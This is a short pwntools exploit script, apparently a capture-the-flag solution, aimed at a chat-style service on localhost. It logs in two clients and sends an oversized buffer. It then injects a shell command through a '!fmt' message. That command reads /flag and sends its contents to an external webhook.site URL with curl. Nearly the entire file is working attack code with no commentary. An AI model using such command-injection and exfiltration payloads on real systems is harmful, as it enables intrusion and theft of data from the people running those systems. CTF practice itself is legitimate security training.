from pwn import *
from time import sleep


def send(c, cmd):
    c.sendlineafter("> ", cmd)

def s(c, cmd):
    c.sendafter("> ", cmd)

def conn_server(name):
    c = remote("localhost", 5000)
    c.sendlineafter(b": ", server_id)
    c.sendlineafter(b": ", password)
    c.sendlineafter(b": ", name)
    return c


r = remote("localhost", 5001)
r.recvuntil(b": ")
server_id = r.recvline().strip()
r.recvuntil(b": ")
password = r.recvline().strip()

c1 = conn_server("MAHER")
c2 = conn_server("MAHER")

s(c1, b"M"*0xe8)
s(c2, b"!fmt LOL")
r.recvuntil("FILTER")
sleep(1.2)
s(c1, "!fmt '; curl https://webhook.site/1c099f17-26f4-40c1-8a33-e4ef9636471d\?GG=$(cat /flag); echo ' Hi")


c2.interactive()

pause()

